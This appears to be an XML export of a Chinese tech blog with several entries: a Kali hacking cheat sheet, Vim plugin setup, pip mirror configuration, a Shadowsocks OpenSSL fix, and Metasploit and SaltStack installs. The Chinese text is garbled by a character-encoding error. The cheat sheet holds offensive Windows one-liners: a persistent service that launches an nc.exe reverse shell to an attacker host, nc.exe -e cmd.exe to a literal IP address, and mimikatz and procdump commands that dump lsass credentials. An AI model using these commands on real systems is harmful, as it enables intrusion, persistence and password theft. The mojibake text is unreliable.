‰ΩøÁî®ÈößÈÅìËΩ¨ÂèëÊú¨Âú∞Á´ØÂè£Âà∞ËøúÁ®ãÁõÆÊ†áÁ´ØÂè£[createTunnel] 7777:172.16.0.4:3389# Ê≠•È™§ 5# ‰ΩøÁî® RDP ËøûÊé•ËøúÁ®ã$ /usr/bin/rdesktop -g 1024x768 -P -z -x l -k en-us -r sound:off localhost:7777 Linux Â∏∏Áî®ÂÆâÂÖ®ÂëΩ‰ª§1234567891011121314151617181920212223242526272829303132333435363738394041# ‰ΩøÁî® uid Êü•ÊâæÂØπÂ∫îÁöÑÁ®ãÂ∫èfind / -uid 0 -perm -4000# Êü•ÊâæÂì™ÈáåÊã•ÊúâÂÜôÊùÉÈôêfind / -perm -o=w# Êü•ÊâæÂêçÁß∞‰∏≠ÂåÖÂê´ÁÇπÂíåÁ©∫Ê†ºÁöÑÊñá‰ª∂find / -name &quot; &quot; -printfind / -name &quot;..&quot; -printfind / -name &quot;. &quot; -printfind / -name &quot; &quot; -print# Êü•Êâæ‰∏çÂ±û‰∫é‰ªª‰Ωï‰∫∫ÁöÑÊñá‰ª∂find / -nouser# Êü•ÊâæÊú™ÈìæÊé•ÁöÑÊñá‰ª∂lsof +L1# Ëé∑ÂèñËøõÁ®ãÊâìÂºÄÁ´ØÂè£ÁöÑ‰ø°ÊÅØlsof -i# ÁúãÁúã ARP Ë°®‰∏≠ÊòØÂê¶ÊúâÂ•áÊÄ™ÁöÑ‰∏úË•øarp -a# Êü•ÁúãÊâÄÊúâË¥¶Êà∑getent passwd# Êü•ÁúãÊâÄÊúâÁî®Êà∑ÁªÑgetent group# Âàó‰∏æÊâÄÊúâÁî®Êà∑ÁöÑ crontabsfor user in $(getent passwd|cut -f1 -d:); do echo &quot;### Crontabs for $user ####&quot;; crontab -u $user -l; done# ÁîüÊàêÈöèÊú∫ÂØÜÁ†Åcat /dev/urandom| tr -dc ‚Äòa-zA-Z0-9-_!@#$%^&amp;*()_+&#123;&#125;|:&lt;&gt;?=‚Äô|fold -w 12| head -n 4# Êü•ÊâæÊâÄÊúâ‰∏çÂèØ‰øÆÊîπÁöÑÊñá‰ª∂find . | xargs -I file lsattr -a file 2&gt;/dev/null | grep ‚Äò^‚Ä¶.i‚Äô# ‰ΩøÊñá‰ª∂‰∏çÂèØ‰øÆÊîπchattr -i file ÂÆûÁî®ÁöÑ Windows cmd ÂëΩ‰ª§123456789101112net localgroup Usersnet localgroup Administratorssearch dir/s *.docsystem(&quot;start cmd.exe /k $cmd&quot;)sc create microsoft_update binpath=&quot;cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe&quot; start= auto error= ignore/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;Procdump.exe -accepteula -ma lsass.exe lsass.dmpmimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp 32 ‰ΩçÁ≥ªÁªüC:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp 64 ‰ΩçÁ≥ªÁªü]]></content>
      <categories>
        <category>Sec</category>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Hacker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ëá™ÂÆö‰πâVIMÊèí‰ª∂‰∏∫IDEÂà©Âô®]]></title>
    <url>%2F2016%2F12%2F21%2Fvim-plugin%2F</url>
    <content type="text"><![CDATA[Â¶ÇÂõæÊòØVIMËá™ÂÆö‰πâÊèí‰ª∂ÂèäÈÖçÁΩÆÂêéÁöÑÊºîÁ§∫ÔºåËôΩÁÑ∂ÊúâPycharm‰ΩÜÊòØÁÆó‰∏ç‰∏äËΩªÈáèÁ∫ßÔºåÂÜô‰∏™ËøêÁª¥Â∞èËÑöÊú¨Ê†πÊú¨Áî®‰∏çÂà∞Ôºå‰∏ÄËà¨Á¨îËÄÖÂè™ÊúâÂú®ÂÜôDjangoÊàñËØªpythonÈ°πÁõÆÊ∫êÁ†ÅÁöÑÊó∂ÂÄô‰ºöÁî®ÔºåsoÊàë‰ª¨ÂºÄÂßãÂêß 1. ÂÆâË£ÖÊèí‰ª∂ÁÆ°ÁêÜÂ∑•ÂÖ∑Vundle1git clone https://github.com/gmarik/vundle.git ~/.vim/bundle/vundle ÁºñËæëÊñá‰ª∂~/.vimrc 123456789101112131415set nocompatible &quot; be iMprovedfiletype off &quot; required!set rtp+=~/.vim/bundle/vundle/call vundle#rc()&quot;my Bundle here:Bundle &apos;Valloric/YouCompleteMe&apos; &quot;‰ª£Á†ÅË°•ÂÖ®Plugin &apos;Yggdroot/indentLine&apos; &quot;ÂûÇÁõ¥ÂØπÈΩêÁ∫øPlugin &apos;Chiel92/vim-autoformat&apos; &quot;Ëá™Âä®ËØ≠Ê≥ïÁº©Ëøõfiletype plugin indent on&quot; hot key ‰øÆÊîπÂÆåÊàêÂêéÂëΩ‰ª§Ë°åÊâßË°å vim +PluginInstall +qall Á≠âÂæÖÂÆâË£ÖÂÆåÊàêÔºåÊâßË°åvim +BundleInstall +qall ‰∏ãËΩΩValloric/YouCompleteMeÂåÖÔºàÂèØËÉΩ‰πÖ‰∫õÔºâ 2. ÁºñËØëÂÆâË£ÖYouCompleteMeÂÆâË£ÖÁºñËØëÊâÄÈúÄËΩØ‰ª∂Ôºö 12sudo apt-get install build-essential cmakesudo apt-get install python-dev python3-dev ÂèØÈÄâÁºñËØëÊîØÊåÅ‰ª£Á†ÅË°•ÂÖ®1. ÁºñËØëÂÖ∑ÊúâÂØπCÁ≥ªÂàóËØ≠Ë®ÄÊîØÊåÅÁöÑYCMÔºö 12cd ~/.vim/bundle/YouCompleteMe./install.py --clang-completer 2. ÁºñËØëYCMÊ≤°ÊúâCËØ≠Ë®ÄÁöÑÊîØÊåÅÔºö 12cd ~/.vim/bundle/YouCompleteMe./install.py 3. ÁºñËØëÊâÄÊúâÊîØÊåÅÁöÑËØ≠Ë®ÄÔºö 12cd ~/.vim/bundle/YouCompleteMe./install.py --all ËÑöÊú¨‰ºöËá™Âä®‰∏ãËΩΩÊâÄÈúÄÂåÖÔºåÁ¨îËÄÖÈÄâÊã©ÁöÑÊòØÁºñËØëÊâÄÊúâÊîØÊåÅËØ≠Ë®ÄÂÖ®ÈÉ®‰∏ãÊù•Â§ßÂ∞èÂú®400MBÂ∑¶Âè≥ 3. Êä•ÈîôËß£ÂÜ≥Êä•ÈîôÂ¶Ç‰∏ãÔºö 1YouCompleteMe unavailable: requires Vim compiled with Python 2.x support ÂéüÂõ†Ôºö ÊâßË°åvim --version|grep python 12-python-python3 vimÁºñËØëÂÆâË£ÖÁöÑÊó∂ÂÄôÈªòËÆ§Ê≤°ÊúâÊîØÊåÅPython Ëß£ÂÜ≥Ôºö Âú®Debian‰∏≠sudo apt-get install vim-nox Âú®Ubuntu‰∏≠sudo apt-get install vim-gnome-py2 ÂÖ∂‰ªñLinuxÂèëË°åÁâà‰∏≠Â¶ÇÊûúÊ≤°Êúâ‰∏äËø∞ËΩØ‰ª∂ÂåÖÔºåÈúÄË¶ÅÈáçÊñ∞‰∏ãËΩΩvimÊ∫êÁ†ÅÈáçÊñ∞ÁºñËØëÔºåÂä†ÈÄâÈ°π--enable-python3interp=yes Êõ¥Â§öËß£ÂÜ≥ÊñπÊ°àÔºöstackoverflow Âè™Êúâ‰∏™Âà´ÂèëË°åÁâà‰∏≠Vim‰ºö‰∏çÁºñËØëÊîØÊåÅPython ÈôÑÂä†Ôºö python‰∫§‰∫íÊ®°Âºè‰∏≠‰ª£Á†ÅËá™Âä®Ë°•ÂÖ®ÔºåÂèäÁ¨îËÄÖ.vimrcÈÖçÁΩÆÊñá‰ª∂ÂÆ∂ÁõÆÂΩïÂÜôÂÖ•.pythontabÊñá‰ª∂ vim ~/.pythontab 12345678910111213141516171819# python startup file# -*- coding: utf8 -*-import sysimport readlineimport rlcompleterimport atexitimport os# tab completionreadline.parse_and_bind('tab: complete') #tabÈîÆÂèØËá™ÂÆö‰πâ# history filehistfile = os.path.join(os.environ['HOME'], '.pythonhistory')try: readline.read_history_file(histfile)except IOError: passatexit.register(readline.write_history_file, histfile)del os, histfile, readline, rlcompleter chmod +x .pythontab ÁºñËæë~/.bashrcÊñá‰ª∂Âä†ÂÖ•ÁéØÂ¢ÉÂèòÈáè 1echo "export PYTHONSTARTUP=~/.pythontab" &gt;&gt; ~/.bashrc &amp;&amp; source ~/.bashrc ÊµãËØïÔºö ÂèåÂáªtabÈîÆË°•ÂÖ®,ÂèØÊõ¥ÊîπÂú®~/.pythontabÊñá‰ª∂‰∏≠ÊúâÂÅöÊ≥®Èáä 123456789101112kionf@kionf-pc[18:23]~:$ pythonPython 2.7.12+ (default, Aug 4 2016, 20:04:34) [GCC 6.1.1 20160724] on linux2Type "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; import random&gt;&gt;&gt; random.random.BPF random.__reduce__( random.betavariate(random.LOG4 random.__reduce_ex__( random.choice(random.NV_MAGICCONST random.__repr__( random.division..........................................................................random.__package__ random._warn( &gt;&gt;&gt; random. .vimrcÈÖçÁΩÆÊñá‰ª∂ 12345678910111213141516171819202122232425set nocompatible " be iMprovedset tabstop=4 "tabÈîÆ‰∏∫4‰∏™Á©∫Ê†ºset shiftwidth=4set expandtabset nu "ÊòæÁ§∫Ë°åÂè∑ÔºåÂ§çÂà∂ÁöÑÊó∂ÂÄôÂèØ‰ª•:set nu!Êù•ÂèñÊ∂àÊòæÁ§∫syntax onfiletype off " required!set rtp+=~/.vim/bundle/vundle/call vundle#rc()"my Bundle here:Bundle 'Valloric/YouCompleteMe'Plugin 'Yggdroot/indentLine'Plugin 'Chiel92/vim-autoformat'filetype plugin indent on" hot keynoremap &lt;F3&gt; :Autoformat&lt;CR&gt; "Ëá™Âä®Áº©Ëøõnnoremap &lt;silent&gt; &lt;F2&gt; :!clear;python %&lt;CR&gt; "Ë∞ÉËØïpythonÊñá‰ª∂vim‰∏ãF2ËøêË°åÂΩìÂâçÊñá‰ª∂]]></content>
      <categories>
        <category>Vim</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Êõ¥ÊîπpipÊ∫ê‰∏∫ÂõΩÂÜÖÈòøÈáåÊ∫ê]]></title>
    <url>%2F2016%2F12%2F15%2Flinux-pip%2F</url>
    <content type="text"><![CDATA[pipÈªòËÆ§Ê∫ê‰∏∫ÂõΩÂ§ñÔºåsoÊèêÈ´ò‰∏ãËΩΩÈÄüÂ∫¶Êõ¥Êç¢ÂõΩÂÜÖÈòøÈáåÊ∫êÔºåÂèäaptÊ∫ê„ÄÅÂÆöÂà∂bashÂëΩ‰ª§Ë°åÊèêÁ§∫Á¨¶ÔºåÂ∫üËØù‰∏çÂ§öÁõ¥Ëøõ‰∏ªÈ¢ò 1. ÂàõÂª∫ÈÖçÁΩÆÊñá‰ª∂1mkdir ~/.pip/ &amp;&amp; cd ~/.pip/; vim pip.conf 2. Ê∑ªÂä†ÈòøÈáåÊ∫êÊ∑ªÂä†Â¶Ç‰∏ãÂÜÖÂÆπ 12345[global]index-url = http://mirrors.aliyun.com/pypi/simple/[install]trusted-host=mirrors.aliyun.com 3. ÊµãËØï1234567891011root@kalivi[12:13].pip:# pip install --upgrade pipYou are using pip version 7.1.0, however version 9.0.1 is available.You should consider upgrading via the 'pip install --upgrade pip' command.Collecting pip Downloading http://mirrors.aliyun.com/pypi/packages/b6/ac/7015eb97dc749283ffdec1c3a88ddb8ae03b8fad0f0e611408f196358da3/pip-9.0.1-py2.py3-none-any.whl (1.3MB) 100% |‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà| 1.3MB 5.0MB/s Installing collected packages: pip Found existing installation: pip 7.1.0 Uninstalling pip-7.1.0: Successfully uninstalled pip-7.1.0Successfully installed pip-9.0.1 ÈôÑ‰∏äkali rollingÊ∏ÖÂçéÂ§ßÂ≠¶aptÈïúÂÉèÊ∫ê deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contrib ÂÆöÂà∂bashÂëΩ‰ª§Ë°åÊèêÁ§∫Á¨¶123echo "PS1='\[\e[31m\]\u@\h\[\e[m\][\A]\[\e[34m\]\W:\[\e[34m\]\$\[\e[m\] '" &gt;&gt; ~/.bashrc &amp;&amp; source ~/.bashrcroot@kalivi[12:23]~:#]]></content>
      <categories>
        <category>Linux</category>
        <category>pip</category>
      </categories>
      <tags>
        <tag>pip</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ShadowSocksÂêØÂä®Êä•Èîôundefined symbol EVP_CIPHER_CTX_cleanup]]></title>
    <url>%2F2016%2F12%2F15%2Ferrornote-ss%2F</url>
    <content type="text"><![CDATA[Ëß£ÂÜ≥opensslÂçáÁ∫ßÂà∞1.1.0‰ª•‰∏äÁâàÊú¨ÔºåÂØºËá¥shadowsocks2.8.2ÂêØÂä®Êä•undefined symbol: EVP_CIPHER_CTX_cleanupÈîôËØØ„ÄÇ ÂáÜÂ§áÁøªÂ¢ôÂÜ≤Êµ™ÁöÑÊó∂ÂÄôShadowsocksÊä•ÈîôÂ¶Ç‰∏ãÔºö12AttributeError: /usr/local/ssl/lib/libcrypto.so.1.1: undefined symbol: EVP_CIPHER_CTX_cleanupshadowsocks start failed Ëß£ÂÜ≥ÊñπÊ≥ï Ôºö1. vimÊâìÂºÄÊñá‰ª∂openssl.pyvim /usr/local/lib/python3.5/dist-packages/shadowsocks/crypto/openssl.py Ë∑ØÂæÑ‰∏çÂêåÊ†πÊçÆÊä•ÈîôË∑ØÂæÑËÄåÂÆö 2. ‰øÆÊîπlibcrypto.EVP_CIPHER_CTX_cleanup.argtypes:%s/cleanup/reset/ :x ‰ª•‰∏ä‰∏§Êù°‰∏∫VIMÂëΩ‰ª§Ôºå ÊõøÊç¢Êñá‰∏≠libcrypto.EVP_CIPHER_CTX_cleanup.argtypes ‰∏∫libcrypto.EVP_CIPHER_CTX_reset.argtypes ÂÖ±‰∏§Â§ÑÔºåÂπ∂‰øùÂ≠ò 3. ËøêË°åShadowsocksOK ÂéüÂõ†ÔºöËøô‰∏™ÈóÆÈ¢òÊòØÁî±‰∫éÂú®openssl1.1.0ÁâàÊú¨‰∏≠ÔºåÂ∫üÂºÉ‰∫ÜEVP_CIPHER_CTX_cleanupÂáΩÊï∞ÔºåÂ¶ÇÂÆòÁΩë‰∏≠ÊâÄËØ¥Ôºö EVP_CIPHER_CTX was made opaque in OpenSSL 1.1.0. As a result, EVP_CIPHER_CTX_reset() appeared and EVP_CIPHER_CTX_cleanup() disappeared. EVP_CIPHER_CTX_init() remains as an alias for EVP_CIPHER_CTX_reset(). EVP_CIPHER_CTX_resetÂáΩÊï∞Êõø‰ª£‰∫ÜEVP_CIPHER_CTX_cleanupÂáΩÊï∞ EVP_CIPHER_CTX_resetÂáΩÊï∞ËØ¥ÊòéÔºö EVP_CIPHER_CTX_reset() clears all information from a cipher context and free up any allocated memory associate with it, except the ctx itself. This function should be called anytime ctx is to be reused for another EVP_CipherInit() / EVP_CipherUpdate() / EVP_CipherFinal() series of calls. EVP_CIPHER_CTX_cleanupÂáΩÊï∞ËØ¥ÊòéÔºö EVP_CIPHER_CTX_cleanup() clears all information from a cipher context and free up any allocated memory associate with it. It should be called after all operations using a cipher are complete so sensitive information does not remain in memory. ÂèØ‰ª•ÁúãÂá∫Ôºå‰∫åËÄÖÂäüËÉΩÂü∫Êú¨‰∏äÁõ∏ÂêåÔºåÈÉΩÊòØÈáäÊîæÂÜÖÂ≠òÔºåÂè™ÊòØÂ∫îËØ•Ë∞ÉÁî®ÁöÑÊó∂Êú∫Á®çÊúâ‰∏çÂêåÔºåÊâÄ‰ª•Áî®reset‰ª£ÊõøcleanupÈóÆÈ¢ò‰∏çÂ§ß„ÄÇ ÊèêÁ§∫Ôºöopenssl1.1.0ÁõÆÂâçÂÖºÂÆπÊÄßÂæà‰∏çÂ•ΩÔºåÂ§ßÈÉ®ÂàÜÁöÑËΩØ‰ª∂ÈÉΩ‰∏çÊîØÊåÅÁõÆÂâçÊîØÊåÅÁöÑÊúânginx-1.11.5„ÄÅcurl-7.50.3‰∏çÊîØÊåÅÁöÑÊúâPHP-7.0.12„ÄÅopenssh-7.3p1ÊâÄ‰ª•Â¶ÇÊûúÂÜ≥ÂÆö‰ΩøÁî®openssl1.1.0ÈúÄË¶ÅËÄÉËôëÂæàÂ§öÂÖºÂÆπÈóÆÈ¢òÔºåÂøÖÈ°ª‰øùÁïô1.0.2Êàñ1.0.1(‰∏çÊé®ËçêÔºåÂ≠òÂú®‰∏Ä‰∫õÂ∑≤Áü•ÊºèÊ¥ûÔºåÊúÄÈáçË¶ÅÁöÑÊòØÂ¶ÇÊûúÊúçÂä°Âô®Ë¶ÅÂºÄhttp2ÔºåÁî±‰∫éÊñ∞ÁâàchromeÂøÖÈ°ª‰ΩøÁî®ALPNÁöÑÈôêÂà∂ÔºåÂè™Êúâ1.0.2ÁâàÊú¨ÊîØÊåÅALPNÔºåÊâÄ‰ª•ÂøÖÈ°ªÂçáÁ∫ßÂà∞1.0.2)ÁâàÊú¨‰ª•‰æøÁºñËØëÂÖ∂‰ªñÁ®ãÂ∫è„ÄÇ]]></content>
      <categories>
        <category>ErrorNote</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[RedHat6/CentOS6 ÂÆâË£ÖMetasploit]]></title>
    <url>%2F2016%2F12%2F06%2Fkali-metasploit%2F</url>
    <content type="text"><![CDATA[Êú¨Á´†ËÆ∞ÂΩïÂú®RedHat6/CentOS6‰∏äÂÆâË£ÖMetasploitÔºåÂõ†‰∏∫ÂùëÈòüÂèãÁªô‰∫ÜÂè∞Redhat6Á≥ªÁªüÁöÑ‰∫ë‰∏ªÊú∫„ÄÇÂè™ËÉΩËá™Â∑±ÊêûËµ∑Êù•‰∫Ü 1. MetasploitmsfËøôÈÉ®ÂàÜmsfinstallËÑöÊú¨‰ºöËá™Âä®Êù•ÂÆâË£ÖÔºåÊâÄ‰ª•ÈúÄË¶ÅÈÖçÁΩÆÁöÑ‰πüÊØîËæÉÂ∞ë ‰∏ãËΩΩÂÆòÊñπÊèê‰æõÁöÑÂÆâË£ÖËÑöÊú¨ÔºåÂπ∂ÊâßË°å 1curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall ÈùôÈùôÁ≠âÂæÖÂÆÉ‰∏ãËΩΩÂÆå„ÄÇ„ÄÇ„ÄÇmsfinstallËÑöÊú¨Âè™‰ºöÂÆâË£ÖmetasploitÔºå‰∏ç‰ºöÂÆâË£Öpostgresql 2. Postgresqlyum -y install postgresql postgresql-server ËøôÈáåÊàë‰ΩøÁî®ÁöÑÊòØepelÊ∫ê rpm -ivh http://dl.fedoraproject.org/pub/epel/6Server/x86_64/epel-release-6-8.noarch.rpm yum clean all &amp;&amp; yum makecache 3. ÈÖçÁΩÆPostgresql(1)Ê∑ªÂä†Êï∞ÊçÆÂ∫ìÔºåÁî®Êà∑ÂàùÂßãÂåñÂêØÂä® : service postgresql initdb service postgresql start 1234567891011121314#ÂàáÊç¢Âà∞ÊôÆÈÄöÁî®Êà∑su - postgres#ÂàõÂª∫Êï∞ÊçÆÂ∫ìÂíåÁî®Êà∑psqlpostgres=# create user "youruser" with password 'yourpasswd' nocreatedb;CREATE ROLEpostgres=# create database "msf4" with owner="youruser";CREATE DATABASEpostgres=# \qÈÄÄÂá∫ (2)‰øÆÊîπÊúçÂä°ÈÖçÁΩÆÊñá‰ª∂ÂàáÊç¢Âõûroot vim /var/lib/pgsql/data/postgresql.conf Âú®ÊàëÁöÑÊú∫Âô®‰∏äÊòØËøô‰∏™Êñá‰ª∂ÔºåÊúâÂèØËÉΩ‰ºö‰∏çÂêåÔºåÂêçÂ≠ó‰∏ÄÊ†∑Ëá™Ë°åÊü•Êâæ 1234567#ÂÖ±‰øÆÊîπ2Â§ÑÊõ¥Êîπ #listen_addresses = 'localhost'‰∏∫ listen_addresses = '127.0.0.1'Êõ¥Êîπ #password_encryption = on‰∏∫ password_encryption = on vim /var/lib/pgsql/data/pg_hba.conf 123#Êñá‰ª∂Êú´Â∞æÂ§ÑÊõ¥Êîπ host all all 127.0.0.1/32 ident‰∏∫ host all all 127.0.0.1/32 md5 (3)ÈáçÂêØÊúçÂä°service postgresql restart psql -U youruser -h 127.0.0.1 -dmsf4 ÊµãËØïÊòØÂê¶ÈÖçÁΩÆÊàêÂäü 4. ÈÖçÁΩÆMetasploitvim /root/.msf4/database.yml Ê∑ªÂä†Â¶Ç‰∏ãÂÜÖÂÆπ 123456789production: adapter: "postgresql" database: "msf4" username: "youruser" password: "yourpasswd" host: "127.0.0.1" port: 5432 pool: 5 timeout: 5 cp /root/.msf4/database.yml /var/lib/pgsql/.msf4/database.yml msfÂàùÂßãÂåñÊï∞ÊçÆÂ∫ì su - postgres msfdb init 5. ËøêË°åmsfmsfconsole Êü•ÁúãÊï∞ÊçÆÂ∫ìËøûÊé•Áä∂ÊÄÅ msf &gt; db_status [*] postgresql connected to msf4#Ë°®Á§∫ËøûÊé•ÊàêÂäü ÂΩì‰ΩøÁî®searchÊêúÁ¥¢Ê®°Êùø‰ºöÊèêÁ§∫[!] Module database cache not built yet, using slow searchÊÑèÊÄùÊòØÊï∞ÊçÆÂ∫ìÊ≤°ÊúâÂª∫Á´ãÁºìÂ≠ò msf &gt; db_rebuild_cache ËøôÊ†∑Â∞±‰ºöÂú®ÂêéÂè∞Âª∫Á´ãÊï∞ÊçÆÂ∫ìÁºìÂ≠ò‰∫ÜÔºåËá≥Ê≠§ÂÖ®ÈÉ®ÂÆâË£ÖÈÖçÁΩÆÂ∑≤ÂÆåÊàê„ÄÇÂêéÈù¢‰ºöÂÜô‰∏ÄÂÜôÂÖ≥‰∫émetasploitÁöÑÂ∫îÁî®„ÄÇ]]></content>
      <categories>
        <category>Sec</category>
        <category>metasploit</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux Ëá™Âä®ÂåñËøêÁª¥‰πãSlatStackÂÆâË£Ö]]></title>
    <url>%2F2016%2F07%2F18%2Flinux-saltstack01%2F</url>
    <content type="text"><![CDATA[slatstackÂÖ•Èó®ÂÆâË£Ö saltstackÂü∫Êú¨ÂéüÁêÜÔºö SaltStackÈááÁî® C/SÊ®°ÂºèÔºåserverÁ´ØÂ∞±ÊòØsaltÁöÑmasterÔºåclientÁ´ØÂ∞±ÊòØminionÔºåminion‰∏émaster‰πãÈó¥ÈÄöËøáZeroMQÊ∂àÊÅØÈòüÂàóÈÄö‰ø°ÔºåÊòØ‰∏Ä‰∏™ÂêåÊó∂ÂØπ‰∏ÄÁªÑÊúçÂä°Âô®ËøõË°åËøúÁ®ãÊâßË°åÂëΩ‰ª§ÂíåÁä∂ÊÄÅÁÆ°ÁêÜÁöÑÂ∑•ÂÖ∑„ÄÇ minion‰∏äÁ∫øÂêéÂÖà‰∏émasterÁ´ØËÅîÁ≥ªÔºåÊääËá™Â∑±ÁöÑpub keyÂèëËøáÂéªÔºåËøôÊó∂masterÁ´ØÈÄöËøásalt-key -LÂëΩ‰ª§Â∞±‰ºöÁúãÂà∞minionÁöÑkeyÔºåÊé•ÂèóËØ•minion-keyÂêéÔºå‰πüÂ∞±ÊòØmaster‰∏éminionÂ∑≤Áªè‰∫í‰ø° masterÂèØ‰ª•ÂèëÈÄÅ‰ªª‰ΩïÊåá‰ª§ËÆ©minionÊâßË°å‰∫ÜÔºåsaltÊúâÂæàÂ§öÂèØÊâßË°åÊ®°ÂùóÔºåÊØîÂ¶ÇËØ¥cmdÊ®°ÂùóÔºåÂú®ÂÆâË£ÖminionÁöÑÊó∂ÂÄôÂ∑≤ÁªèËá™Â∏¶‰∫ÜÔºåÂÆÉ‰ª¨ÈÄöÂ∏∏‰Ωç‰∫é‰Ω†ÁöÑpythonÂ∫ì‰∏≠Ôºålocate salt | grep /usr/ÂèØ‰ª•ÁúãÂà∞saltËá™Â∏¶ÁöÑÊâÄÊúâ‰∏úË•ø„ÄÇ Ëøô‰∫õÊ®°ÂùóÊòØpythonÂÜôÊàêÁöÑÊñá‰ª∂ÔºåÈáåÈù¢‰ºöÊúâÂ•ΩÂ§öÂáΩÊï∞ÔºåÂ¶Çcmd.runÔºåÂΩìÊàë‰ª¨ÊâßË°åsalt &#39;*&#39; cmd.run &#39;uptime&#39;ÁöÑÊó∂ÂÄôÔºåmaster‰∏ãÂèë‰ªªÂä°ÂåπÈÖçÂà∞ÁöÑminion‰∏äÂéªÔºåminionÊâßË°åÊ®°ÂùóÂáΩÊï∞ÔºåÂπ∂ËøîÂõûÁªìÊûú„ÄÇmasterÁõëÂê¨4505Âíå4506Á´ØÂè£Ôºå4505ÂØπÂ∫îÁöÑÊòØZMQÁöÑPUB systemÔºåÁî®Êù•ÂèëÈÄÅÊ∂àÊÅØÔºå4506ÂØπÂ∫îÁöÑÊòØREP systemÊòØÊù•Êé•ÂèóÊ∂àÊÅØÁöÑ„ÄÇ ÂÖ∑‰ΩìÊ≠•È™§Â¶Ç‰∏ã: Salt stackÁöÑMaster‰∏éMinion‰πãÈó¥ÈÄöËøáZeroMqËøõË°åÊ∂àÊÅØ‰º†ÈÄíÔºå‰ΩøÁî®‰∫ÜZeroMqÁöÑÂèëÂ∏É-ËÆ¢ÈòÖÊ®°ÂºèÔºåËøûÊé•ÊñπÂºèÂåÖÊã¨tcpÔºåipc saltÂëΩ‰ª§ÔºåÂ∞Ücmd.run lsÂëΩ‰ª§‰ªésalt.client.LocalClient.cmd_cliÂèëÂ∏ÉÂà∞masterÔºåËé∑Âèñ‰∏Ä‰∏™JodidÔºåÊ†πÊçÆjobidËé∑ÂèñÂëΩ‰ª§ÊâßË°åÁªìÊûú„ÄÇ masterÊé•Êî∂Âà∞ÂëΩ‰ª§ÂêéÔºåÂ∞ÜË¶ÅÊâßË°åÁöÑÂëΩ‰ª§ÂèëÈÄÅÁªôÂÆ¢Êà∑Á´Øminion„ÄÇ minion‰ªéÊ∂àÊÅØÊÄªÁ∫ø‰∏äÊé•Êî∂Âà∞Ë¶ÅÂ§ÑÁêÜÁöÑÂëΩ‰ª§Ôºå‰∫§Áªôminion._handle_aesÂ§ÑÁêÜ minion._handle_aesÂèëËµ∑‰∏Ä‰∏™Êú¨Âú∞Á∫øÁ®ãË∞ÉÁî®cmdmodÊâßË°ålsÂëΩ‰ª§„ÄÇÁ∫øÁ®ãÊâßË°åÂÆålsÂêéÔºåË∞ÉÁî®minion._return_pubÊñπÊ≥ïÔºåÂ∞ÜÊâßË°åÁªìÊûúÈÄöËøáÊ∂àÊÅØÊÄªÁ∫øËøîÂõûÁªômaster masterÊé•Êî∂Âà∞ÂÆ¢Êà∑Á´ØËøîÂõûÁöÑÁªìÊûúÔºåË∞ÉÁî®master._handle_aesÊñπÊ≥ïÔºåÂ∞ÜÁªìÊûúÂÜôÁöÑÊñá‰ª∂‰∏≠ salt.client.LocalClient.cmd_cliÈÄöËøáËΩÆËØ¢Ëé∑ÂèñJobÊâßË°åÁªìÊûúÔºåÂ∞ÜÁªìÊûúËæìÂá∫Âà∞ÁªàÁ´Ø„ÄÇ ‰∏ãÈù¢ËÆ©Êàë‰ª¨Êù•‰ΩøÁî®ÂÆÉÔºåÊâçËÉΩÊõ¥Â•ΩÁöÑÁêÜËß£ÂÆÉÁöÑÂ∑•‰ΩúÊ®°ÂºèÂíåÂéüÁêÜ ÂÆâË£Ö CentOS6/Redhat6 1sudo yum install https://repo.saltstack.com/yum/redhat/salt-repo-latest-1.el6.noarch.rpm 1yum clean all ÂÆâË£Ösalt-minion, salt-master, ÊàñËÄÖÂÖ∂ÂÆÉÁªÑ‰ª∂ 123456sudo yum install salt-master #serverÁ´Øsudo yum install salt-minion #clientÁ´Øsudo yum install salt-sshsudo yum install salt-syndicsudo yum install salt-cloudsudo yum install salt-api ÊúçÂä°Á´Ø 1sudo yum install salt-master ÂÆ¢Êà∑Á´Ø 1sudo yum install salt-minion ÈÖçÁΩÆ :ÊúçÂä°Á´Ø vim /etc/salt/master#masterÊ∂àÊÅØÂèëÂ∏ÉÁ´ØÂè£ Default: 4505 publish_port: 4505 #Â∑•‰ΩúÁ∫øÁ®ãÊï∞ÔºåÂ∫îÁ≠îÂíåÊé•Âèóminion Default: 5 worker_threads: 100 #ÂÆ¢Êà∑Á´Ø‰∏éÊúçÂä°Á´ØÈÄö‰ø°ÁöÑÁ´ØÂè£ Default: 4506 ret_port: 4506 # Ëá™Âä®Êé•ÂèóÊâÄÊúâÂÆ¢Êà∑Á´Ø auto_accept: True # Ëá™Âä®ËÆ§ËØÅÈÖçÁΩÆ autosign_file: /etc/salt/autosign.conf ÂÆ¢Êà∑Á´Ø vim /etc/salt/minion# master IPÊàñÂüüÂêç master: 10.0.0.1 # ÂÆ¢Êà∑Á´Ø‰∏éÊúçÂä°Á´ØÈÄö‰ø°ÁöÑÁ´ØÂè£„ÄÇ Default: 4506 syndic_master_port: 4506 # Âª∫ËÆÆÁ∫ø‰∏äÁî®ipÊòæÁ§∫Êàñ‰∏öÂä°ÁºñÂè∑ id: test id minionÁöÑÂîØ‰∏ÄÊ†áÁ§∫„ÄÇDefault: hostname minion 